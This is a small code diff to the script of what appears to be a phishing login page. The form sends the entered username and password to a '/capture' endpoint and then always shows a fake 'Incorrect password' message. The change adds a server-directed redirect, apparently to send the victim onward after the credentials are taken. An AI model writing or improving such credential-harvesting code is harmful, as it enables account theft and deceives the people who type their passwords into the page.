@@ -21,11 +21,13 @@
 document.getElementById('f').addEventListener('submit', async e => {
   e.preventDefault();
   const fd = new FormData(e.target);
-  await fetch('/capture', {
+  const r = await fetch('/capture', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ user: fd.get('user'), pass: fd.get('pass') })
   });
+  const j = await r.json().catch(() => ({}));
+  if (j.redirect) { window.location = j.redirect; return; }
   document.getElementById('msg').textContent = 'Incorrect password. Try again.';
   e.target.reset();
 });
